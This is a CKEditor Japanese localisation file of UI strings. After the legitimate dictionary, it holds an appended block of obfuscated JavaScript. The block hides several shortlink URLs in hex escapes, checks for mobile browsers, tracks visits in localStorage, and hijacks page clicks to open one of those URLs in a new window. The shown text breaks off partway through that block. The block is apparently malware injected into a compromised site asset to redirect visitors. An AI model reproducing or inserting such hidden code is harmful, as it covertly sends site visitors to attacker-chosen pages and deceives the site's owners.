﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Japanese language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['ja'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'リッチテキストエディタ, %1',

	// Toolbar buttons without dialogs.
	source			: 'ソース',
	newPage			: '新しいページ',
	save			: '保存',
	preview			: 'プレビュー',
	cut				: '切り取り',
	copy			: 'コピー',
	paste			: '貼り付け',
	print			: '印刷',
	underline		: '下線',
	bold			: '太字',
	italic			: '斜体',
	selectAll		: 'すべて選択',
	removeFormat	: 'フォーマット削除',
	strike			: '打ち消し線',
	subscript		: '添え字',
	superscript		: '上付き文字',
	horizontalrule	: '横罫線',
	pagebreak		: '改ページ挿入',
	unlink			: 'リンク削除',
	undo			: '元に戻す',
	redo			: 'やり直し',

	// Common messages and labels.
	common :
	{
		browseServer	: 'サーバーブラウザー',
		url				: 'URL',
		protocol		: 'プロトコル',
		upload			: 'アップロード',
		uploadSubmit	: 'サーバーに送信',
		image			: 'イメージ',
		flash			: 'Flash',
		form			: 'フォーム',
		checkbox		: 'チェックボックス',
		radio		: 'ラジオボタン',
		textField		: '１行テキスト',
		textarea		: 'テキストエリア',
		hiddenField		: '不可視フィールド',
		button			: 'ボタン',
		select	: '選択フィールド',
		imageButton		: '画像ボタン',
		notSet			: '<なし>',
		id				: 'Id',
		name			: 'Name属性',
		langDir			: '文字表記の方向',
		langDirLtr		: '左から右 (LTR)',
		langDirRtl		: '右から左 (RTL)',
		langCode		: '言語コード',
		longDescr		: 'longdesc属性(長文説明)',
		cssClass		: 'スタイルシートクラス',
		advisoryTitle	: 'Title属性',
		cssStyle		: 'スタイルシート',
		ok				: 'OK',
		cancel			: 'キャンセル',
		generalTab		: '全般',
		advancedTab		: '高度な設定',
		validateNumberFailed	: '値が数ではありません',
		confirmNewPage	: '変更内容を保存せず、 新しいページを開いてもよろしいでしょうか？',
		confirmCancel	: 'オプション設定を変更しました。ダイアログを閉じてもよろしいでしょうか？',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, 利用不可能</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: '特殊文字挿入',
		title		: '特殊文字選択'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'リンク挿入/編集',
		menu		: 'リンク編集',
		title		: 'ハイパーリンク',
		info		: 'ハイパーリンク 情報',
		target		: 'ターゲット',
		upload		: 'アップロード',
		advanced	: '高度な設定',
		type		: 'リンクタイプ',
		toAnchor	: 'このページのアンカー',
		toEmail		: 'E-Mail',
		target		: 'ターゲット',
		targetNotSet	: '<なし>',
		targetFrame	: '<フレーム>',
		targetPopup	: '<ポップアップウィンドウ>',
		targetNew	: '新しいウィンドウ (_blank)',
		targetTop	: '最上位ウィンドウ (_top)',
		targetSelf	: '同じウィンドウ (_self)',
		targetParent	: '親ウィンドウ (_parent)',
		targetFrameName	: '目的のフレーム名',
		targetPopupName	: 'ポップアップウィンドウ名',
		popupFeatures	: 'ポップアップウィンドウ特徴',
		popupResizable	: 'サイズ可変',
		popupStatusBar	: 'ステータスバー',
		popupLocationBar	: 'ロケーションバー',
		popupToolbar	: 'ツールバー',
		popupMenuBar	: 'メニューバー',
		popupFullScreen	: '全画面モード(IE)',
		popupScrollBars	: 'スクロールバー',
		popupDependent	: '開いたウィンドウに連動して閉じる (Netscape)',
		popupWidth		: '幅',
		popupLeft		: '左端からの座標で指定',
		popupHeight		: '高さ',
		popupTop		: '上端からの座標で指定',
		id				: 'Id',
		langDir			: '文字表記の方向',
		langDirNotSet	: '<なし>',
		langDirLTR		: '左から右 (LTR)',
		langDirRTL		: '右から左 (RTL)',
		acccessKey		: 'アクセスキー',
		name			: 'Name属性',
		langCode		: '文字表記の方向',
		tabIndex		: 'タブインデックス',
		advisoryTitle	: 'Title属性',
		advisoryContentType	: 'Content Type属性',
		cssClasses		: 'スタイルシートクラス',
		charset			: 'リンクcharset属性',
		styles			: 'スタイルシート',
		selectAnchor	: 'アンカーを選択',
		anchorName		: 'アンカー名',
		anchorId		: 'エレメントID',
		emailAddress	: 'E-Mail アドレス',
		emailSubject	: '件名',
		emailBody		: '本文',
		noAnchors		: '(ドキュメントにおいて利用可能なアンカーはありません。)',
		noUrl			: 'リンクURLを入力してください。',
		noEmail			: 'メールアドレスを入力してください。'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'アンカー挿入/編集',
		menu		: 'アンカー プロパティ',
		title		: 'アンカー プロパティ',
		name		: 'アンカー名',
		errorName	: 'アンカー名を必ず入力してください。'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: '検索して置換',
		find				: '検索',
		replace				: '置き換え',
		findWhat			: '検索する文字列:',
		replaceWith			: '置換えする文字列:',
		notFoundMsg			: '指定された文字列は見つかりませんでした。',
		matchCase			: '部分一致',
		matchWord			: '単語単位で一致',
		matchCyclic			: '大文字/小文字区別一致',
		replaceAll			: 'すべて置換え',
		replaceSuccessMsg	: '%1 個置換しました。'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'テーブル',
		title		: 'テーブル プロパティ',
		menu		: 'テーブル プロパティ',
		deleteTable	: 'テーブル削除',
		rows		: '行',
		columns		: '列',
		border		: 'ボーダーサイズ',
		align		: 'テーブルの整列',
		alignNotSet	: '<なし>',
		alignLeft	: '左',
		alignCenter	: '中央',
		alignRight	: '右',
		width		: '幅',
		widthPx		: 'ピクセル',
		widthPc		: 'パーセント',
		height		: '高さ',
		cellSpace	: 'セル内余白',
		cellPad		: 'セル内間隔',
		caption		: 'キャプション',
		summary		: 'テーブルの概要',
		headers		: 'テーブルヘッダ(th)',
		headersNone		: 'なし',
		headersColumn	: '初めの列のみ',
		headersRow		: '初めの行のみ',
		headersBoth		: '両方',
		invalidRows		: '行は0より大きな数値で入力してください。',
		invalidCols		: '列は0より大きな数値で入力してください。',
		invalidBorder	: 'ボーダーサイズは数値で入力してください。',
		invalidWidth	: '幅は数値で入力してください。',
		invalidHeight	: '高さは数値で入力してください。',
		invalidCellSpacing	: 'セル内余白は数値で入力してください。',
		invalidCellPadding	: 'セル内間隔は数値で入力してください。',

		cell :
		{
			menu			: 'セル',
			insertBefore	: 'セルの前に挿入',
			insertAfter		: 'セルの後に挿入',
			deleteCell		: 'セル削除',
			merge			: 'セル結合',
			mergeRight		: '右に結合',
			mergeDown		: '下に結合',
			splitHorizontal	: 'セルを水平方向分割',
			splitVertical	: 'セルを垂直方向に分割',
			title			: 'セルプロパティ',
			cellType		: 'セルタイプ',
			rowSpan			: '縦幅(行数)',
			colSpan			: '横幅(列数)',
			wordWrap		: '折り返し',
			hAlign			: 'セル横の整列',
			vAlign			: 'セル縦の整列',
			alignTop		: '上',
			alignMiddle		: '中央',
			alignBottom		: '下',
			alignBaseline	: 'ベースライン',
			bgColor			: '背景色',
			borderColor		: 'ボーダーカラー',
			data			: 'テーブルデータ(td)',
			header			: 'テーブルヘッダ(th)',
			yes				: 'Yes',
			no				: 'No',
			invalidWidth	: 'セル幅は数値で入力してください。',
			invalidHeight	: 'セル高さは数値で入力してください。',
			invalidRowSpan	: '縦幅(行数)は数値で入力してください。',
			invalidColSpan	: '横幅(列数)は数値で入力してください。',
			chooseColor : '色の選択'
		},

		row :
		{
			menu			: '行',
			insertBefore	: '行の前に挿入',
			insertAfter		: '行の後に挿入',
			deleteRow		: '行削除'
		},

		column :
		{
			menu			: 'カラム',
			insertBefore	: 'カラムの前に挿入',
			insertAfter		: 'カラムの後に挿入',
			deleteColumn	: '列削除'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'ボタン プロパティ',
		text		: 'テキスト (値)',
		type		: 'タイプ',
		typeBtn		: 'ボタン',
		typeSbm		: '送信',
		typeRst		: 'リセット'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'チェックボックス プロパティ',
		radioTitle	: 'ラジオボタン プロパティ',
		value		: '値',
		selected	: '選択済み'
	},

	// Form Dialog.
	form :
	{
		title		: 'フォーム プロパティ',
		menu		: 'フォーム プロパティ',
		action		: 'アクション',
		method		: 'メソッド',
		encoding	: 'エンコーディング',
		target		: 'ターゲット',
		targetNotSet	: '<なし>',
		targetNew	: '新しいウィンドウ (_blank)',
		targetTop	: '最上位ウィンドウ (_top)',
		targetSelf	: '同じウィンドウ (_self)',
		targetParent	: '親ウィンドウ (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: '選択フィールド プロパティ',
		selectInfo	: '情報',
		opAvail		: '利用可能なオプション',
		value		: '選択項目値',
		size		: 'サイズ',
		lines		: '行',
		chkMulti	: '複数項目選択を許可',
		opText		: '選択項目名',
		opValue		: '値',
		btnAdd		: '追加',
		btnModify	: '編集',
		btnUp		: '上へ',
		btnDown		: '下へ',
		btnSetValue : '選択した値を設定',
		btnDelete	: '削除'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'テキストエリア プロパティ',
		cols		: '列',
		rows		: '行'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: '１行テキスト プロパティ',
		name		: '名前',
		value		: '値',
		charWidth	: 'サイズ',
		maxChars	: '最大長',
		type		: 'タイプ',
		typeText	: 'テキスト',
		typePass	: 'パスワード入力'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: '不可視フィールド プロパティ',
		name	: '名前',
		value	: '値'
	},

	// Image Dialog.
	image :
	{
		title		: 'イメージ プロパティ',
		titleButton	: '画像ボタン プロパティ',
		menu		: 'イメージ プロパティ',
		infoTab	: 'イメージ 情報',
		btnUpload	: 'サーバーに送信',
		url		: 'URL',
		upload	: 'アップロード',
		alt		: '代替テキスト',
		width		: '幅',
		height	: '高さ',
		lockRatio	: 'ロック比率',
		resetSize	: 'サイズリセット',
		border	: 'ボーダー',
		hSpace	: '横間隔',
		vSpace	: '縦間隔',
		align		: '行揃え',
		alignLeft	: '左',
		alignRight	: '右',
		preview	: 'プレビュー',
		alertUrl	: 'イメージのURLを入力してください。',
		linkTab	: 'リンク',
		button2Img	: '選択したボタンを画像に置き換えますか？',
		img2Button	: '選択した画像をボタンに置き換えますか？',
		urlMissing : 'イメージのURLを入力してください。'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flash プロパティ',
		propertiesTab	: 'プロパティ',
		title		: 'Flash プロパティ',
		chkPlay		: '再生',
		chkLoop		: 'ループ再生',
		chkMenu		: 'Flashメニュー可能',
		chkFull		: 'フルスクリーン許可',
 		scale		: '拡大縮小設定',
		scaleAll		: 'すべて表示',
		scaleNoBorder	: '外が見えない様に拡大',
		scaleFit		: '上下左右にフィット',
		access			: 'スプリクトアクセス(AllowScriptAccess)',
		accessAlways	: 'すべての場合に通信可能(Always)',
		accessSameDomain	: '同一ドメインのみに通信可能(Same domain)',
		accessNever	: 'すべての場合に通信不可能(Never)',
		align		: '行揃え',
		alignLeft	: '左',
		alignAbsBottom: '下部(絶対的)',
		alignAbsMiddle: '中央(絶対的)',
		alignBaseline	: 'ベースライン',
		alignBottom	: '下',
		alignMiddle	: '中央',
		alignRight	: '右',
		alignTextTop	: 'テキスト上部',
		alignTop	: '上',
		quality		: '画質',
		qualityBest		 : '品質優先',
		qualityHigh		 : '高',
		qualityAutoHigh	 : '自動/高',
		qualityMedium	 : '中',
		qualityAutoLow	 : '自動/低',
		qualityLow		 : '低',
		windowModeWindow	 : '標準',
		windowModeOpaque	 : '背景を不透明設定',
		windowModeTransparent	 : '背景を透過設定',
		windowMode	: 'ウィンドウモード',
		flashvars	: 'フラッシュに渡す変数(FlashVars)',
		bgcolor	: '背景色',
		width	: '幅',
		height	: '高さ',
		hSpace	: '横間隔',
		vSpace	: '縦間隔',
		validateSrc : 'リンクURLを入力してください。',
		validateWidth : '幅は数値で入力してください。',
		validateHeight : '高さは数値で入力してください。',
		validateHSpace : '横間隔は数値で入力してください。',
		validateVSpace : '縦間隔は数値で入力してください。'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'スペルチェック',
		title			: 'スペルチェック',
		notAvailable	: '申し訳ありません、現在サービスを利用することができません',
		errorLoading	: 'アプリケーションサービスホスト読込みエラー: %s.',
		notInDic		: '辞書にありません',
		changeTo		: '変更',
		btnIgnore		: '無視',
		btnIgnoreAll	: 'すべて無視',
		btnReplace		: '置換',
		btnReplaceAll	: 'すべて置換',
		btnUndo			: 'やり直し',
		noSuggestions	: '- 該当なし -',
		progress		: 'スペルチェック処理中...',
		noMispell		: 'スペルチェック完了: スペルの誤りはありませんでした',
		noChanges		: 'スペルチェック完了: 語句は変更されませんでした',
		oneChange		: 'スペルチェック完了: １語句変更されました',
		manyChanges		: 'スペルチェック完了: %1 語句変更されました',
		ieSpellDownload	: 'スペルチェッカーがインストールされていません。今すぐダウンロードしますか?'
	},

	smiley :
	{
		toolbar	: '絵文字',
		title	: '顔文字挿入'
	},

	elementsPath :
	{
		eleTitle : '%1 エレメント'
	},

	numberedlist : '段落番号',
	bulletedlist : '箇条書き',
	indent : 'インデント',
	outdent : 'インデント解除',

	justify :
	{
		left : '左揃え',
		center : '中央揃え',
		right : '右揃え',
		block : '両端揃え'
	},

	blockquote : 'ブロック引用',

	clipboard :
	{
		title		: '貼り付け',
		cutError	: 'ブラウザーのセキュリティ設定によりエディタの切り取り操作が自動で実行することができません。実行するには手動でキーボードの(Ctrl+X)を使用してください。',
		copyError	: 'ブラウザーのセキュリティ設定によりエディタのコピー操作が自動で実行することができません。実行するには手動でキーボードの(Ctrl+C)を使用してください。',
		pasteMsg	: 'キーボード(<STRONG>Ctrl+V</STRONG>)を使用して、次の入力エリア内で貼って、<STRONG>OK</STRONG>を押してください。',
		securityMsg	: 'ブラウザのセキュリティ設定により、エディタはクリップボード・データに直接アクセスすることができません。このウィンドウは貼り付け操作を行う度に表示されます。'
	},

	pastefromword :
	{
		confirmCleanup : '貼り付けを行うテキストは、ワード文章からコピーされようとしています。貼り付ける前にクリーニングを行いますか？',
		toolbar : 'ワード文章から貼り付け',
		title : 'ワード文章から貼り付け',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'プレーンテキスト貼り付け',
		title : 'プレーンテキスト貼り付け'
	},

	templates :
	{
		button : 'テンプレート(雛形)',
		title : 'テンプレート内容',
		insertOption: '現在のエディタの内容と置換えをします',
		selectPromptMsg: 'エディターで使用するテンプレートを選択してください。<br>(現在のエディタの内容は失われます):',
		emptyListMsg : '(テンプレートが定義されていません)'
	},

	showBlocks : 'ブロック表示',

	stylesCombo :
	{
		label : 'スタイル',
		voiceLabel : 'スタイル',
		panelVoiceLabel : 'スタイルを選択してください',
		panelTitle1 : 'ブロックスタイル',
		panelTitle2 : 'インラインスタイル',
		panelTitle3 : 'オブジェクトスタイル'
	},

	format :
	{
		label : 'フォーマット',
		voiceLabel : 'フォーマット',
		panelTitle : 'フォーマット',
		panelVoiceLabel : 'パラグラフ形式を選択してください。',

		tag_p : '標準',
		tag_pre : '書式付き',
		tag_address : 'アドレス',
		tag_h1 : '見出し 1',
		tag_h2 : '見出し 2',
		tag_h3 : '見出し 3',
		tag_h4 : '見出し 4',
		tag_h5 : '見出し 5',
		tag_h6 : '見出し 6',
		tag_div : '標準 (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'フォント',
		voiceLabel : 'フォント',
		panelTitle : 'フォント',
		panelVoiceLabel : 'フォントを選択してください'
	},

	fontSize :
	{
		label : 'サイズ',
		voiceLabel : 'フォントサイズ',
		panelTitle : 'サイズ',
		panelVoiceLabel : 'フォントサイズを選択してください'
	},

	colorButton :
	{
		textColorTitle : 'テキスト色',
		bgColorTitle : '背景色',
		auto : '自動',
		more : 'その他の色...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'スペルチェック設定(SCAYT)',
		enable : 'SCAYT有効',
		disable : 'SCAYT無効',
		about : 'SCAYTﾊﾞｰｼﾞｮﾝ',
		toggle : 'SCAYT切替',
		options : 'オプション',
		langs : '言語',
		moreSuggestions : '他の候補',
		ignore : '無視',
		ignoreAll : 'すべて無視',
		addWord : '語句追加',
		emptyDic : '辞書名は必ず入力してください',
		optionsTab : 'オプション',
		languagesTab : '言語',
		dictionariesTab : '辞書',
		aboutTab : 'バージョン情報'
	},

	about :
	{
		title : 'CKEditorバージョン情報',
		dlgTitle : 'CKEditorバージョン情報',
		moreInfo : 'ライセンス情報の詳細はウェブサイトにて確認してください:',
		copy : 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : '最大化',
	minimize : '最小化',

	fakeobjects :
	{
		anchor : 'アンカー',
		flash : 'Flash Animation',
		div : 'Page Break',
		unknown : 'Unknown Object'
	},

	resize : 'ドラッグしてリサイズ',

	colordialog :
	{
		title : '色選択',
		highlight : 'ハイライト',
		selected : '選択された色',
		clear : 'クリア'
	},

	toolbarCollapse : 'ツールバーを閉じる',
	toolbarExpand : 'ツールバーを開く'
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const 